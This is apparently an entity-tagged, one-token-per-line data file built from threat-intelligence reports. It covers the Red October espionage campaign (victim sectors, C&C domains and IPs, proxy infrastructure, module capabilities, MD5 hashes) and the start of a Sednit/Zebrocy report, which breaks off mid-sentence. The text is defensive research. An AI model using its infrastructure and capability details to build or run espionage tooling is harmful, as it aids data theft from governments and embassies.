Kazakhstan
B6E4946A47FC3963ABC1
Russia
C978C25326D96C995038
D48A783D288DC72A702B
Kazakhstan
Russia
DAE795D285E0A01ADED5
DD767EEEF83A62388241
Russia
?

Foreign
Embassy
?

?

?

?

?

Foreign
Embassy
Gov
research
institute
Foreign
Trade
Commission
?

Foreign
Embassy
?

?

Gov
research
institute
Government
?

?

?

?

Energy
research
group
?

Aerospace
Trading
company
Gov
research
institute
In
some
cases
,
it
is
possible
to
create
a
profile
of
the
victim
based
on
the
IP
address
;
in
most
of
the
cases
,
however
,
the
identity
of
the
victim
remains
unknown
.

KSN
+
sinkhole
data
Some
of
the
victim
organizations
were
identified
using
IP
addresses
and
public
WHOIS
information
or
remote
system
names
.

Most
'interesting
'
out
of
those
are
:
Algeria
-
Embassy
Afghanistan
-
Gov
,
Military
,
Embassy
,
Armenia
-
Gov
,
Embassy
Austria
-
Embassy
Azerbaijan
-
Oil/Energy
,
Embassy
,
Research
,
Belarus
-
Research
,
Oil/Energy
,
Gov
,
Embassy
Belgium
-
Embassy
Bosnia
and
Herzegovina
-
Embassy
Botswana
-
Embassy
Brunei
Darussalam
–
Gov
Congo
–
Embassy
Cyprus
-
Embassy
,
Gov
France
-
Embassy
,
Military
Georgia
-
Embassy
Germany
-
Embassy
Greece
–
Embassy
Hungary
-Embassy
India
–
Embassy
Indonesia
-
Embassy
Iran
–
Embassy
Iraq
–
Gov
Ireland
-
Embassy
Israel
-
Embassy
Italy
-Embassy
Japan
-
Trade
,
Embassy
Jordan
-
Embassy
Kazakhstan
-
Gov
,
Research
,
Aerospace
,
Nuclear/Energy
,
Military
Kenya
-
Embassy
Kuwait
-
Embassy
Latvia
-
Embassy
Lebanon
-
Embassy
Lithuania
-
Embassy
Luxembourg
-
Gov
Mauritania
-
Embassy
Moldova
-
Gov
,
Military
,
Embassy
Morocco
-
Embassy
Mozambique
-
Embassy
Oman
-
Embassy
Pakistan
-
Embassy
Portugal
-
Embassy
Qatar
-
Embassy
Russia
-
Embassy
,
Research
,
Military
,
Nuclear/Energy
Saudi
Arabia
-
Embassy
South
Africa
-
Embassy
Spain
-
Gov
,
Embassy
Switzerland
-
Embassy
Tanzania
-
Embassy
Turkey
-
Embassy
Turkmenistan
-
Gov
,
Oil/Energy
Uganda
-
Embassy
Ukraine
-
Military
United
Arab
Emirates
-
Oil/Energy
,
Embassy
,
Gov
United
States
-
Embassy
Uzbekistan
-
Embassy
С
&
C
information
A
list
of
the
most
popular
domains
used
for
command
and
control
can
be
found
below
:
Interestingly
,
although
the
domain
'dll-host-update.com
'
appears
in
one
of
the
malware
configurations
,
it
had
not
been
registered
by
the
attackers
.

The
domain
has
since
been
registered
by
Kaspersky
Lab
on
Nov
2nd
,
2012
to
monitor
the
attacker
's
activities
.

Another
interesting
example
is
'dll-host-udate.com
'
-
the
'udate
'
part
appears
to
be
a
typo
.

All
the
domains
used
by
attackers
appear
to
have
been
registered
between
2007-2012
.

The
oldest
known
domain
was
registered
in
Nov
2007
;
the
newest
on
May
2012
.

Most
of
the
domains
have
been
registered
using
the
service
'reg.ru
'
,
but
other
services
such
as
'webdrive.ru
'
,
'webnames.ru
'
or
'timeweb.ru
'
have
been
used
as
well
.

During
our
monitoring
,
we
observed
the
domains
pointing
to
several
malicious
webservers
.

A
list
of
servers
with
confirmed
malicious
behavior
can
be
found
below
.

In
total
,
we
have
identified
10
different
servers
which
exhibited
confirmed
malicious
behavior
.

Most
of
these
severs
are
located
in
Germany
,
at
Hetzner
Online
Ag
.

During
our
analysis
,
we
were
able
to
obtain
an
image
of
one
of
the
command-and-control
servers
.

The
server
itself
proved
to
be
a
proxy
,
which
was
forwarding
the
request
to
another
server
on
port
40080
.

The
script
responsible
for
redirections
was
found
in
/root/scp.pl
and
relies
on
the
'socat
'
tool
for
stream
redirection
.

By
scanning
the
Internet
for
computers
with
port
40080
open
,
we
were
able
to
identify
three
such
servers
in
total
,
which
we
call
'mini-motherships
'
:
Connecting
to
these
hosts
on
port
40080
and
fetching
the
index
page
,
we
get
the
following
standard
content
which
is
identical
in
all
C
&
Cs
:
Fetching
the
index
info
(
via
HTTP
'HEAD
'
)
for
these
servers
,
reveals
the
following
:
curl
-I
--
referer
'
http://www.google.com/ B_url.normal
'
--
user-agent
'Mozilla/4.0
(
compatible
;
MSIE
6.0
;
Windows
NT
5.1
)
'
http://31.41.45.139:40080 B_url.cncsvr
HTTP/1.1
200
OK
Date
:
Mon
,
12
Nov
2012
09:58:37
GMT
Server
:
Apache
Last-Modified
:
Tue
,
21
Feb
2012
09:00:41
GMT
ETag
:
'8c0bf6-ba-4b975a53906e4
'
Accept-Ranges
:
bytes
Content-Length
:
186
Content-Type
:
text/html
curl
-I
--
referer
'
http://www.google.com/ B_url.normal
'
--
user-agent
'Mozilla/4.0
(
compatible
;
MSIE
6.0
;
Windows
NT
5.1
)
'
http://178.63.208.63:40080 B_url.cncsvr
HTTP/1.1
200
OK
Date
:
Mon
,
12
Nov
2012
09:59:09
GMT
Server
:
Apache
Last-Modified
:
Tue
,
21
Feb
2012
09:00:41
GMT
ETag
:
'8c0bf6-ba-4b975a53906e4
'
Accept-Ranges
:
bytes
Content-Length
:
186
Content-Type
:
text/html
It
should
be
noted
that
the
'last
modified
'
field
of
the
pages
points
to
the
same
date
:
Tue
,
21
Feb
2012
09:00:41
GMT
.

This
is
important
and
probably
indicates
that
the
three
known
mini-motherships
are
probably
just
proxies
themselves
,
pointing
to
the
same
top
level
'mothership
'
server
.

This
allows
us
to
draw
the
following
diagram
of
the
C&C
infrastructure
as
of
November
2012
:
For
the
Command
and
Control
servers
,
the
various
generations
of
the
backdoor
connect
to
different
scripts
:
Domain
Script
location
/cgi-bin/nt/th
nt-windows-update.com B_url.distribute
,
nt-windows-check.com B_url.distribute
,
nt-windows-online.com B_url.distribute
dll-host-update.com B_url.distribute
microsoft-msdn.com B_url.distribute
windows-genuine.com B_url.distribute
windowsonlineupdate.com B_url.distribute
/cgi-bin/nt/sk
/cgi-bin/dllhost/ac
/cgi-bin/ms/check
/cgi-bin/ms/flush
/cgi-bin/win/wcx
/cgi-bin/win/cab
/cgi-bin/win/cab
For
instance
,
the
script
'
/cgi-bin/nt/th
'
is
being
used
to
receive
commands
from
the
command-and-control
server
,
usually
in
the
form
of
new
plugins
to
run
on
the
victim
's
computer
.

The
'
/cgi-bin/nt/sk
'
script
is
called
by
the
running
plugins
to
upload
stolen
data
and
information
about
the
victim
.

When
connecting
to
the
C&C
,
the
backdoor
identifies
itself
with
a
specific
string
which
includes
a
hexadecimal
value
that
appears
to
be
the
victim
's
unique
ID
.

Different
variants
of
the
backdoor
contain
different
victim
IDs
.

Presumably
,
this
allows
the
attackers
to
distinguish
between
the
multitudes
of
connections
and
perform
specific
operations
for
each
victim
individually
.

For
instance
,
a
top
level
XLS
dropper
presumably
used
against
a
Polish
target
,
named
'Katyn_-_opinia_Rosjan.xls
'
contains
the
hardcoded
victim
ID
'F50D0B17F870EB38026F
'
.

A
similar
XLS
named
'tactlist_05-05-2011_.8634.xls
/
EEAS
New
contact
list
(
05-05-2011).xls
'
possibly
used
in
Moldova
contains
a
victim
ID
'
FCF5E48A0AE558F4B859
'
.

Part
2
of
this
paper
will
cover
malware
modules
and
provide
more
technical
details
about
their
operation
.
The
'
Red B_malware.infosteal
October I
'
Campaign
-
An
Advanced
Cyber
Espionage
Network
Targeting
Diplomatic
and
Government
Agencies
Here
's
a
link
to
the
full
paper
(
part
1
)
about
our
Red B_malware.infosteal
October I
research
.

During
the
next
days
,
we
'll
be
publishing
Part
2
,
which
contains
a
detailed
technical
analysis
of
all
the
known
modules
.

Please
stay
tuned
.

During
the
past
five
years
,
a
high
-
level
cyber
-
espionage
campaign
has
successfully
infiltrated
computer
networks
at
diplomatic
,
governmental
and
scientific
research
organizations
,
gathering
data
and
intelligence
from
mobile
devices
,
computer
systems
and
network
equipment
.

Kaspersky
Lab
's
researchers
have
spent
several
months
analyzing
this
malware
,
which
targets
specific
organizations
mostly
in
Eastern
Europe
,
former
USSR
members
and
countries
in
Central
Asia
,
but
also
in
Western
Europe
and
North
America
.

The
campaign
,
identified
as
'
Rocra B_malware.infosteal
'
,
short
for
'
Red B_malware.infosteal
October I
'
,
is
currently
still
active
with
data
being
sent
to
multiple
command-and-control
servers
,
through
a
configuration
which
rivals
in
complexity
the
infrastructure
of
the
Flame
malware
.

Registration
data
used
for
the
purchase
of
C
&
C
domain
names
and
PE
timestamps
from
collected
executables
suggest
that
these
attacks
date
as
far
back
as
May
2007
.

Some
key
findings
from
our
investigation
:
The
attackers
have
been
active
for
at
least
five
years
,
focusing
on
diplomatic
and
governmental
agencies
of
various
countries
across
the
world
.

Information
harvested
from
infected
networks
is
reused
in
later
attacks
.

For
example
,
stolen
credentials
were
compiled
in
a
list
and
used
when
the
attackers
needed
to
guess
passwords
and
network
credentials
in
other
locations
.

To
control
the
network
of
infected
machines
,
the
attackers
created
more
than
60
domain
names
and
several
server
hosting
locations
in
different
countries
(
mainly
Germany
and
Russia
)
.

The
C
&
C
infrastructure
is
actually
a
chain
of
servers
working
as
proxies
and
hiding
the
location
of
the
true
-
mothership
-
command
and
control
server
.

The
attackers
created
a
multi
-
functional
framework
which
is
capable
of
applying
quick
extension
of
the
features
that
gather
intelligence
.

The
system
is
resistant
to
C
&
C
server
takeover
and
allows
the
attacker
to
recover
access
to
infected
machines
using
alternative
communication
channels
.

Beside
traditional
attack
targets
(
workstations
)
,
the
system
is
capable
of
stealing
data
from
mobile
devices
,
such
as
smartphones
(
iPhone
,
Nokia
,
Windows
Mobile
)
;
dumping
enterprise
network
equipment
configuration
(
Cisco
)
;
hijacking
files
from
removable
disk
drives
(
including
already
deleted
files
via
a
custom
file
recovery
procedure
)
;
stealing
e-mail
databases
from
local
Outlook
storage
or
remote
POP
/
IMAP
server
;
and
siphoning
files
from
local
network
FTP
servers
.

We
have
observed
the
use
of
at
least
three
different
exploits
for
previously
known
vulnerabilities
:
CVE-2009-3129
(
MS
Excel
)
,
CVE-2010-3333
(
MS
Word
)
and
CVE-2012-0158
(
MS
Word
)
.

The
earliest
known
attacks
used
the
exploit
for
MS
Excel
and
took
place
in
2010
and
2011
,
while
attacks
targeting
the
MS
Word
vulnerabilities
appeared
in
the
summer
of
2012
.

The
exploits
from
the
documents
used
in
spear
phishing
were
created
by
other
attackers
and
employed
during
different
cyber
attacks
against
Tibetan
activists
as
well
as
military
and
energy
sector
targets
in
Asia
.

The
only
thing
that
was
changed
is
the
executable
which
was
embedded
in
the
document
;
the
attackers
replaced
it
with
their
own
code
.

Sample
fake
image
used
in
one
of
the
Rocra B_malware.infosteal
spear
phishing
attacks
.

During
lateral
movement
in
a
victim
's
network
,
the
attackers
deploy
a
module
to
actively
scan
the
local
area
network
,
find
hosts
vulnerable
for
MS08-067
(
the
vulnerability
exploited
by
Conficker
)
or
accessible
with
admin
credentials
from
its
own
password
database
.

Another
module
used
collected
information
to
infect
remote
hosts
in
the
same
network
.

Based
on
registration
data
of
the
C
&
C
servers
and
numerous
artifacts
left
in
executables
of
the
malware
,
we
strongly
believe
that
the
attackers
have
Russian
-
speaking
origins
.

Current
attackers
and
executables
developed
by
them
have
been
unknown
until
recently
,
they
have
never
related
to
any
other
targeted
cyber
attacks
.

Notably
,
one
of
the
commands
in
the
Trojan
dropper
switches
the
codepage
of
an
infected
machine
to
1251
before
installation
.

This
is
required
to
address
files
and
directories
that
contain
Cyrillic
characters
in
their
names
.

Rocra B_malware.infosteal
FAQ
:
What
is
Rocra B_malware.infosteal
?

Where
does
the
name
come
from
?

Was
Operation
Rocra B_malware.infosteal
targeting
any
specific
industries
,
organizations
or
geographical
regions
?

Rocra B_malware.infosteal
(
short
for
'
Red B_malware.infosteal
October I
'
)
is
a
targeted
attack
campaign
that
has
been
going
on
for
at
least
five
years
.

It
has
infected
hundreds
of
victims
around
the
world
in
eight
main
categories
:
1
.

Government
2
.

Diplomatic
/
embassies
3
.

Research
institutions
4
.

Trade
and
commerce
5
.

Nuclear
/
energy
research
6
.

Oil
and
gas
companies
7
.

Aerospace
8
.

Military
It
is
quite
possible
there
are
other
targeted
sectors
which
have
n't
been
discovered
yet
or
have
been
attacked
in
the
past
.

How
and
when
was
it
discovered
?

We
have
come
by
the
Rocra B_malware.infosteal
attacks
in
October
2012
,
at
the
request
of
one
of
our
partners
.

By
analysing
the
attack
,
the
spear
phishing
and
malware
modules
,
we
understood
the
scale
of
this
campaign
and
started
dissecting
it
in
depth
.

Who
provided
you
with
the
samples
?

Our
partner
who
originally
pointed
us
to
this
malware
prefers
to
remain
anonymous
.

How
many
infected
computers
have
been
identified
by
Kaspersky
Lab
?

How
many
victims
are
there
?

What
is
the
estimated
size
of
Operation
Red B_malware.infosteal
October I
on
a
global
scale
?

During
the
past
months
,
we
've
counted
several
hundreds
of
infections
worldwide
-
all
of
them
in
top
locations
such
as
government
networks
and
diplomatic
institutions
.

The
infections
we
've
identified
are
distributed
mostly
in
Eastern
Europe
,
but
there
are
also
reports
coming
from
North
America
and
Western
European
countries
such
as
Switzerland
or
Luxembourg
.

Based
on
our
Kaspersky
Security
Network
(
KSN
)
here
's
a
list
of
countries
with
most
infections
(
only
for
those
with
more
than
5
victims
)
:
Country
Infections
RUSSIAN
FEDERATION
KAZAKHSTAN
AZERBAIJAN
BELGIUM
INDIA
35
21
15
15
14
AFGHANISTAN
ARMENIA
IRAN
;
ISLAMIC
REPUBLIC
OF
TURKMENISTAN
UKRAINE
UNITED
STATES
VIET
NAM
BELARUS
GREECE
ITALY
MOROCCO
PAKISTAN
SWITZERLAND
UGANDA
UNITED
ARAB
EMIRATES
10
10
7766655555555
For
the
sinkhole
statistics
see
below
.

Who
is
behind/responsible
for
this
operation
?

Is
this
a
nation-state
sponsored
attack
?

The
information
we
have
collected
so
far
does
not
appear
to
point
towards
any
specific
location
,
however
,
two
important
factors
stand
out
:
The
exploits
appear
to
have
been
created
by
Chinese
hackers
.

The
Rocra B_malware.infosteal
malware
modules
have
been
created
by
Russian-speaking
operatives
.

Currently
,
there
is
no
evidence
linking
this
with
a
nation-state
sponsored
attack
.

The
information
stolen
by
the
attackers
is
obviously
of
the
highest
level
and
includes
geopolitical
data
which
can
be
used
by
nation
states
.

Such
information
could
be
traded
in
the
underground
and
sold
to
the
highest
bidder
,
which
can
be
of
course
,
anywhere
.

Are
there
any
interesting
texts
in
the
malware
that
can
suggest
who
the
attackers
are
?

Several
Rocra B_malware.infosteal
modules
contain
interesting
typos
and
mis-spellings
:
network_scanner
:
'SUCCESSED
'
,
'Error_massage
'
,
'natrive_os
'
,
'natrive_lan
'
imapispool
:
'UNLNOWN_PC_NAME
'
,
'WinMain
:
error
CreateThred
stop
'
mapi_client
:
'Default
Messanger
'
,
'BUFEER
IS
FULL
'
msoffice_plugin
:
'my_encode
my_dencode
'
winmobile
:
'Zakladka
injected
'
,
'
Can
not
inject
zakladka
,
Error
:
%
u
'
PswSuperMailRu
:
'
--
--
--
-PROGA
START
--
--
-
'
,
'
--
--
--
-PROGA
END
--
--
-
'
The
word
'PROGA
'
used
in
here
might
refer
to
transliteration
of
Russian
slang
'ПРОГА
'
,
which
literally
means
an
application
or
a
program
among
Russian-speaking
software
engineers
.

In
particular
,
the
word
'Zakladka
'
in
Russian
can
mean
:
'bookmark
'
(
more
likely
)
a
slang
term
meaning
'
undeclared
functionality
'
,
i.e.
in
software
or
hardware
.

However
,
it
may
also
mean
a
microphone
embedded
in
a
brick
of
the
embassy
building
.

The
C++
class
that
holds
the
C
&
C
configuration
parameters
is
called
'MPTraitor
'
and
the
corresponding
configuration
section
in
the
resources
is
called
'conn_a
'
.

Some
examples
include
:
What
kind
of
information
is
being
hijacked
from
infected
machines
?

Information
stolen
from
infected
systems
includes
documents
with
extensions
:
txt
,
csv
,
eml
,
doc
,
vsd
,
sxw
,
odt
,
docx
,
rtf
,
pdf
,
mdb
,
xls
,
wab
,
rst
,
xps
,
iau
,
cif
,
key
,
crt
,
cer
,
hse
,
pgp
,
gpg
,
xia
,
xiu
,
xis
,
xio
,
xig
,
acidcsa
,
acidsca
,
aciddsk
,
acidpvr
,
acidppr
,
acidssa
.

In
particular
,
the
'acid*
'
extensions
appear
to
refer
to
the
classified
software
'Acid
Cryptofiler
'
,
which
is
used
by
several
entities
such
as
the
European
Union
and/or
NATO
.

What
is
the
purpose/objective
of
this
operation
?

What
were
the
attackers
looking
for
by
conducting
this
sustained
cyber-espionage
campaign
for
so
many
years
?

The
main
purpose
of
the
operation
appears
to
be
the
gathering
of
classified
information
and
geopolitical
intelligence
,
although
it
seems
that
the
information
gathering
scope
is
quite
wide
.

During
the
past
five
years
,
the
attackers
collected
information
from
hundreds
of
high
profile
victims
although
it
's
unknown
how
the
information
was
used
.

It
is
possible
that
the
information
was
sold
on
the
black
market
,
or
used
directly
.

What
are
the
infection
mechanisms
for
the
malware
?

Does
it
have
self-propagating
(
worm
)
capabilities
?

How
does
it
work
?

Do
the
attackers
have
a
customized
attack
platform
?

The
main
malware
body
acts
as
a
point
of
entry
into
the
system
which
can
later
download
modules
used
for
lateral
movement
.

After
initial
infection
,
the
malware
wo
n't
propagate
by
itself
-
typically
,
the
attackers
would
gather
information
about
the
network
for
a
few
days
,
identify
key
systems
and
then
deploy
modules
which
can
compromise
other
computers
in
the
network
,
for
instance
by
using
the
MS08-067
exploit
.

In
general
,
the
Rocra B_malware.infosteal
framework
is
designed
for
executing
'tasks
'
that
are
provided
by
its
C
&
C
servers
.

Most
of
the
tasks
are
provided
as
one-time
PE
DLL
libraries
that
are
received
from
the
server
,
executed
in
memory
and
then
immediately
discarded
.

Several
tasks
however
need
to
be
constantly
present
in
the
system
,
i.e.
waiting
for
the
iPhone
or
Nokia
mobile
to
connect
.

These
tasks
are
provided
as
PE
EXE
files
and
are
installed
in
the
infected
machine
.

Examples
of
'persistent
'
tasks
Once
a
USB
drive
is
connected
,
search
and
extract
files
by
mask/format
,
including
deleted
files
.

Deleted
files
are
restored
using
a
built
in
file
system
parser
Wait
for
an
iPhone
or
a
Nokia
phone
to
be
connected
.

Once
connected
,
retrieve
information
about
the
phone
,
its
phone
book
,
contact
list
,
call
history
,
calendar
,
SMS
messages
,
browsing
history
Wait
for
a
Windows
Mobile
phone
to
be
connected
.

Once
connected
,
infect
the
phone
with
a
mobile
version
of
the
Rocra B_malware.infosteal
main
component
Wait
for
a
specially
crafted
Microsoft
Office
or
PDF
document
and
execute
a
malicious
payload
embedded
in
that
document
,
implementing
a
one-way
covert
channel
of
communication
that
can
be
used
to
restore
control
of
the
infected
machine
Record
all
the
keystrokes
,
make
screenshots
Execute
additional
encrypted
modules
according
to
a
pre-defined
schedule
Retrieve
e-mail
messages
and
attachments
from
Microsoft
Outlook
and
from
reachable
mail
servers
using
previously
obtained
credentials
Examples
of
'one-time
'
tasks
Collect
general
software
and
hardware
environment
information
Collect
filesystem
and
network
share
information
,
build
directory
listings
,
search
and
retrieve
files
by
mask
provided
by
the
C
&
C
server
Collect
information
about
installed
software
,
most
notably
Oracle
DB
,
RAdmin
,
IM
software
including
Mail.Ru
agent
,
drivers
and
software
for
Windows
Mobile
,
Nokia
,
SonyEricsson
,
HTC
,
Android
phones
,
USB
drives
Extract
browsing
history
from
Chrome
,
Firefox
,
Internet
Explorer
,
Opera
Extract
saved
passwords
for
Web
sites
,
FTP
servers
,
mail
and
IM
accounts
Extract
Windows
account
hashes
,
most
likely
for
offline
cracking
Extract
Outlook
account
information
Determine
the
external
IP
address
of
the
infected
machine
Download
files
from
FTP
servers
that
are
reachable
from
the
infected
machine
(
including
those
that
are
connected
to
its
local
network
)
using
previously
obtained
credentials
Write
and/or
execute
arbitrary
code
provided
within
the
task
Perform
a
network
scan
,
dump
configuration
data
from
Cisco
devices
if
available
Perform
a
network
scan
within
a
predefined
range
and
replicate
to
vulnerable
machines
using
the
MS08-067
vulnerability
Replicate
via
network
using
previously
obtained
administrative
credentials
The
Rocra B_malware.infosteal
framework
was
designed
by
the
attackers
from
scratch
and
has
n't
been
used
in
any
other
operations
.

Was
the
malware
limited
to
only
workstations
or
did
it
have
additional
capabilities
,
such
as
a
mobile
malware
component
?

Several
mobile
modules
exist
,
which
are
designed
to
steal
data
from
several
types
of
devices
:
Windows
Mobile
iPhone
Nokia
These
modules
are
installed
in
the
system
and
wait
for
mobile
devices
to
be
connected
to
the
victim
's
machine
.

When
a
connection
is
detected
,
the
modules
start
collecting
data
from
the
mobile
phones
.

How
many
variants
,
modules
or
malicious
files
were
identified
during
the
overall
duration
of
Operation
Red B_malware.infosteal
October I
?

During
our
investigation
,
we
've
uncovered
over
1000
modules
belonging
to
30
different
module
categories
.

These
have
been
created
between
2007
with
the
most
recent
being
compiled
on
8th
Jan
2013
.

Here
's
a
list
of
known
modules
and
categories
:
Were
initial
attacks
launched
at
select
'high-profile
'
victims
or
were
they
launched
in
series
of
larger
(
wave
)
attacks
at
organizations/victims
?

All
the
attacks
are
carefully
tuned
to
the
specifics
of
the
victims
.

For
instance
,
the
initial
documents
are
customized
to
make
them
more
appealing
and
every
single
module
is
specifically
compiled
for
the
victim
with
a
unique
victim
ID
inside
.

Later
,
there
is
a
high
degree
of
interaction
between
the
attackers
and
the
victim
-
the
operation
is
driven
by
the
kind
of
configuration
the
victim
has
,
which
type
of
documents
the
use
,
installed
software
,
native
language
and
so
on
.

Compared
to
Flame
and
Gauss
,
which
are
highly
automated
cyberespionage
campaigns
,
Rocra B_malware.infosteal
is
a
lot
more
'personal
'
and
finely
tuned
for
the
victims
.

Is
Rocra B_malware.infosteal
related
in
any
way
to
the
Duqu
,
Flame
and
Gauss
malware
?

Simply
put
,
we
could
not
find
any
connections
between
Rocra B_malware.infosteal
and
the
Flame
/
Tilded
platforms
.

How
does
Operation
Rocra B_malware.infosteal
compare
to
similar
campaigns
such
as
Aurora
and
Night
Dragon
?

Any
notable
similarities
or
differences
?

Compared
to
Aurora
and
Night
Dragon
,
Rocra B_malware.infosteal
is
a
lot
more
sophisticated
.

During
our
investigation
we
've
uncovered
over
1000
unique
files
,
belonging
to
about
30
different
module
categories
.

Generally
speaking
,
the
Aurora
and
Night
Dragon
campaigns
used
relatively
simple
malware
to
steal
confidential
information
.

With
Rocra B_malware.infosteal
,
the
attackers
managed
to
stay
in
the
game
for
over
5
years
and
evade
detection
of
most
antivirus
products
while
continuing
to
exfiltrate
what
must
be
hundreds
of
Terabytes
by
now
.

How
many
Command
&
Control
servers
are
there
?

Did
Kaspersky
Lab
conduct
any
forensic
analysis
on
them
?

During
our
investigation
,
we
uncovered
more
than
60
domain
names
used
by
the
attackers
to
control
and
retrieve
data
from
the
victims
.

The
domain
names
map
to
several
dozen
IPs
located
mostly
in
Russia
and
Germany
.

Here
's
an
overview
of
the
Rocra B_malware.infosteal
's
command
and
control
infrastructure
,
as
we
believe
it
looks
from
our
investigations
:
More
detailed
information
about
the
Command
and
Control
servers
will
be
revealed
at
a
later
date
.

Did
you
sinkhole
any
of
the
Command
&
Control
servers
?

We
were
able
to
sinkhole
six
of
the
over
60
domains
used
by
the
various
versions
of
the
malware
.

During
the
monitoring
period
(
2
Nov
2012
-
10
Jan
2013
)
,
we
registered
over
55,000
connections
to
the
sinkhole
.

The
number
of
different
IPs
connecting
to
the
sinkhole
was
250
.

From
the
point
of
view
of
country
distribution
of
connections
to
the
sinkhole
,
we
have
observed
victims
in
39
countries
,
with
most
of
IPs
being
from
Switzerland
.

Kazakhstan
and
Greece
follow
next
.

Sinkhole
statistics
-
2
Nov
2012
-
10
Jan
2013
Is
Kaspersky
Lab
working
with
any
governmental
organizations
,
Computer
Emergency
Response
Teams
(
CERTs
)
,
law
enforcement
agencies
or
security
companies
as
part
of
the
investigation
and
disinfection
efforts
?

Kaspersky
Lab
,
in
collaboration
with
international
organizations
,
Law
Enforcement
,
Computer
Emergency
Response
Teams
(
CERTs
)
and
other
IT
security
companies
is
continuing
its
investigation
of
Operation
Red B_malware.infosteal
October I
by
providing
technical
expertise
and
resources
for
remediation
and
mitigation
procedures
.

Kaspersky
Lab
would
like
to
express
their
thanks
to
:
US-CERT
,
the
Romanian
CERT
and
the
Belarusian
CERT
for
their
assistance
with
the
investigation
.

If
you
are
a
CERT
and
would
like
more
information
about
infections
in
your
country
,
please
contact
us
at
theflame@kaspersky.com
.

Here
's
a
link
to
the
full
paper
(
part
1
)
about
our
Red B_malware.infosteal
October I
research
.

During
the
next
days
,
we
'll
be
publishing
Part
2
,
which
contains
a
detailed
technical
analysis
of
all
the
known
modules
.

Please
stay
tuned
.

A
list
of
MD5s
of
known
documents
used
in
the
Red B_malware.infosteal
October I
attacks
:
114ed0e5298149fc69f6e41566e3717a B_hash
1f86299628bed519718478739b0e4b0c B_hash
2672fbba23bf4f5e139b10cacc837e9f B_hash
350c170870e42dce1715a188ca20d73b B_hash
396d9e339c1fd2e787d885a688d5c646 B_hash
3ded9a0dd566215f04e05340ccf20e0c B_hash
44e70bce66cdac5dc06d5c0d6780ba45 B_hash
4bfa449f1a351210d3c5b03ac2bd18b1 B_hash
4ce5fd18b1d3f551a098bb26d8347ffb B_hash
4daa2e7d3ac1a5c6b81a92f4a9ac21f1 B_hash
50bd553568422cf547539dd1f49dd80d B_hash
51edea56c1e83bcbc9f873168e2370af B_hash
5d1121eac9021b5b01570fb58e7d4622 B_hash
5ecec03853616e13475ac20a0ef987b6 B_hash
5f9b7a70ca665a54f8879a6a16f6adde B_hash
639760784b3e26c1fe619e5df7d0f674 B_hash
65d277af039004146061ff01bb757a8f B_hash
6b23732895daaad4bd6eae1d0b0fef08 B_hash
731c68d2335e60107df2f5af18b9f4c9 B_hash
7e5d9b496306b558ba04e5a4c5638f9f B_hash
82e518fb3a6749903c8dc17287cebbf8 B_hash
85baebed3d22fa63ce91ffafcd7cc991 B_hash
91ebc2b587a14ec914dd74f4cfb8dd0f B_hash
93d0222c8c7b57d38931cfd712523c67 B_hash
9950a027191c4930909ca23608d464cc B_hash
9b55887b3e0c7f1e41d1abdc32667a93 B_hash
9f470a4b0f9827d0d3ae463f44b227db B_hash
a7330ce1b0f89ac157e335da825b22c7 B_hash
b9238737d22a059ff8da903fbc69c352 B_hash
c78253aefcb35f94acc63585d7bfb176 B_hash
fc3c874bdaedf731439bbe28fc2e6bbe B_hash
bb2f6240402f765a9d0d650b79cd2560 B_hash
bd05475a538c996cd6cafe72f3a98fae B_hash
c42627a677e0a6244b84aa977fbea15d B_hash
cb51ef3e541e060f0c56ac10adef37c3 B_hash
ceac9d75b8920323477e8a4acdae2803 B_hash
cee7bd726bc57e601c85203c5767293c B_hash
d71a9d26d4bb3b0ed189c79cd24d179a B_hash
d98378db4016404ac558f9733e906b2b B_hash
dc4a977eaa2b62ad7785b46b40c61281 B_hash
dc8f0d4ecda437c3f870cd17d010a3f6 B_hash
de56229f497bf51274280ef84277ea54 B_hash
ec98640c401e296a76ab7f213164ef8c B_hash
f0357f969fbaf798095b43c9e7a0cfa7 B_hash
f16785fc3650490604ab635303e61de2 B_hash
The
Sednit B_malware.infosteal
group
–
also
known
as
APT28 B_malware.backdoor
,
Fancy B_malware.infosteal
Bear I
,
Sofacy B_malware.infosteal
or
STRONTIUM B_malware.infosteal
–
is
a
group
of
attackers
operating
since
2004
,
if
not
earlier
,
and
whose
main
objective
is
to
steal
confidential
information
from
specific
targets
.

Toward
the
end
of
2015
,
we
started
seeing
a
new
component
being
deployed
by
the
group
:
a
downloader
for
the
main
Sednit B_malware.infosteal
backdoor
,
Xagent
.

Kaspersky
mentioned
this
component
for
the
first
time
in
2017
in
their
APT
trend
report
and
recently
wrote
an
article
where
they
quickly
described
it
under
the
name
Zebrocy B_malware.backdoor
.

This
new
component
is
a
family
of
malware
,
comprising
downloaders
and
backdoors
written
in
Delphi
and
AutoIt
.

These
components
play
the
same
role
in
the
Sednit B_malware.infosteal
ecosystem
as
Seduploader B_malware.backdoor
—
that
of
first-stage
malware
.

Victims
we
have
seen
targeted
by
Zebrocy B_malware.backdoor
are
located
in
Azerbaijan
,
Bosnia
and
Herzegovina
,
Egypt
,
Georgia
,
Iran
,
Kazakhstan
,
Korea
,
Kyrgyzstan
,
Russia
,
Saudi
Arabia
,
Serbia
,
Switzerland
,
Tajikistan
,
Turkey
,
Turkmenistan
,
Ukraine
,
Uruguay
and
Zimbabwe
.

These
targets
include
embassies
,
ministries
of
foreign
affairs
,
and
diplomats
.

The
Zebrocy B_malware.backdoor
family
consists
of
three
components
.

In
the
order
of
deployment
these
are
a
Delphi

downloader
,
an
AutoIt
downloader
and
a
Delphi
backdoor
.

Figure
1
shows
the
relationship
between
these
components
.

In
this
article
we
describe
this
family
and
how
it
can
coexist
with
the
older
Seduploader B_malware.backdoor
reconnaissance
tools
.

We
will
talk
about
some
similarities
to
and
differences
from
Downdelph
at
the
end
.

Figure
1
:
The
Sednit B_malware.infosteal
ecosystem
Figure
1
shows
the
attack
methods
and
active
malware
used
by
Sednit B_malware.infosteal
.

Email
attachments
are
the
main
entry
point
to
the
Sednit B_malware.infosteal
ecosystem
.

DealersChoice
is
still
being
used
,
as
research
from
Palo
Alto
Network
mentioned
in
this
recent
blogpost
.

Both
Seduploader B_malware.backdoor
and
Zebrocy B_malware.backdoor
are
actively
being
delivered
by
the
Sednit B_malware.infosteal
group
through
email
attachments
.

Finally
,
after
a
reconnaissance
phase
,
Xagent
and
Xtunnel
are
deployed
on
the
targets
deemed
interesting
by
the
operators
.

Attack
methods
The
first
component
of
a
Zebrocy-based
attack
arrives
as
an
email
message
.

Victims
are
lured
into
opening
email
attachments
that
can
be
either
Microsoft
Office
documents
,
or
an
archive
.

Malicious
documents
Malicious
documents
used
by
Sednit B_malware.infosteal
download
the
first
stage
payload
via
Visual
Basic
for
